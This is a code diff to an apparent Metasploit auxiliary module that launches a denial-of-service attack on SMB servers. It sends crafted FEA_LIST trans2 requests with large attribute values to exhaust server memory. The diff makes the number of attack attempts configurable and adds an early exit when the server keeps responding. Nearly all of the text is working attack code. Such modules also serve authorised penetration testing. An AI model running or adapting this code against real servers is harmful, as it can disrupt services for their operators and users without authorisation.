@@ -25,8 +25,8 @@ class Metasploit3 < Msf::Auxiliary
 	FEA_LIST = Rex::Struct2::CStructTemplate.new(
 		[ 'uint32v', 'NextOffset', 0x00000000],
 		[ 'uint8', 'Flags', 0x00 ],
-		[ 'uint8', 'NameLen', 0x07 ], # length of Name parameter minus trailing newline
-		[ 'uint16v', 'ValueLen', 0x04 ], #random valuelen with value
+		[ 'uint8', 'NameLen', 0x07 ], # Length of Name parameter minus trailing '\0'
+		[ 'uint16v', 'ValueLen', 0x04 ], # Random valuelen with value
 		[ 'string', 'Name', 7, Rex::Text.rand_text_alpha(6) + "\x00" ], # Random string must end with '\0'
 		[ 'string', 'Value', nil, "\x00\x00\x00\x00" ]
 	)
@@ -52,10 +52,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options(
 			[
-				Opt::RHOST(),
-				Opt::RPORT(445),
 				OptString.new('SMBShare', [true, 'Target share', '']),
 				OptString.new('MsgLen', [true, 'How soon a memory get exhausted depends on the length of that attribute', '1500']),
+				OptString.new('Tries', [true, 'Number of DOS tries', '40']),
 			], self.class)
 
 	end
@@ -67,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 	def mk_items_payload
 		item1 = FEA_LIST.make_struct
 		item2 = FEA_LIST.make_struct
-		item3 = FEA_LIST.make_struct #Some padding
+		item3 = FEA_LIST.make_struct # Some padding
 		item2.v['ValueLen'] = item1.v['ValueLen'] = datastore['MsgLen'].to_i
 		item2.v['Value'] = item1.v['Value'] = "\x00" * datastore['MsgLen'].to_i
 		ilen = item1.to_s.length
@@ -86,7 +85,9 @@ class Metasploit3 < Msf::Auxiliary
 		self.simple.client.trans2(subcmd, trans.to_s, data.to_s, false)
 	end
 	def run
-		40.times do
+		n = datastore['Tries'].to_i;
+
+		n.times do
 			connect()
 			smb_login()
 			self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
@@ -97,6 +98,7 @@ class Metasploit3 < Msf::Auxiliary
 			begin
 				self.simple.client.create("")
 				print_status('Server Responce, DOS unsuccessfull')
+				return
 			rescue Timeout::Error
 				print_good('Server timed out, this is expected')
 			end
